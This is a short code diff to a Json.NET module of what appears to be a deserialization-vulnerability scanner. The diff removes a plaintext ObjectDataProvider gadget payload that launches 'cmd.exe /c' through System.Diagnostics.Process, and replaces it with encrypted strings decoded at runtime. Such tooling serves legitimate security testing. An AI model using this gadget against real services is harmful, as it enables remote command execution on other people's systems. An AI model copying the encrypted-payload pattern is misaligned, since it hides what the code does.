@@ -22,8 +22,8 @@ import java.util.regex.Pattern;
  **********************************************************/
 public class JsonDotNetModule extends FreddyModuleBase {
     //ObjectDataProvider payload data
-    private static final String OBJD_PREFIX = "{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','MethodParameters':{'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','$values':['cmd.exe','/c ";
-    private static final String OBJD_SUFFIX = "']},'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}";
+    private final String OBJD_PREFIX = decrypt("WccOiThTVc6eoJDoTj/xUQDIMTGo7qyxhMAAqvorhWkwHoToEWW+usdiKTnzCyyNle2HiHo1hRCtAGAaMeIerHeXwB3up4vR7WTcVhhEeWiSq4vEeRaA+rh+emdLeTLnCm6t5Nsy5LmYF8haDbuo9p7hsbKc7D4uUd5m+o7a0jS6xdBWER7e7/Ja+HeqyOVs9kQwfS7BgsBMoJw2gk9VSAPNGHDh6MBgP5oU/I3iofMbI2HwXDXtXjBBjXfabgBDdpFnylvTFL/Z3Ht0qP1EqJom8+Eakp5wHuc5AE8hXdr7WXmhfUbwoaFoatHV4KwLc70L1UCMzflcRuTj+wigdMPatZZdDx2xfI9bEVrTn6ZdryOUqJiqkAv3JizgBD2j1GbSyKUcvyOSvnR7s5aOiq6OeyZfvh2yB53BZxIQG4G4BsGQGFnUAmKE53T8sCuz");
+    private final String OBJD_SUFFIX = decrypt("3YyuJEkwPnROLRUh1ys3DFUhq4DXoJYxBBoIs/JLUmolOpOYOEHsUgNuA75D3m9Mzzm5sMH3aF0v9XnwffGDb7L5hxKkK0lYLmIveSqdjIG2Kvprjc6N0vgnZk6wao2etZSePG18LTjI55EOntXu0Brx3oczhJ0bsBmMF0vL3YsDZl8KBlJiXaYeoQ+ij3k1");
 
     protected void initialiseModule() {
         setName("Json.NET");
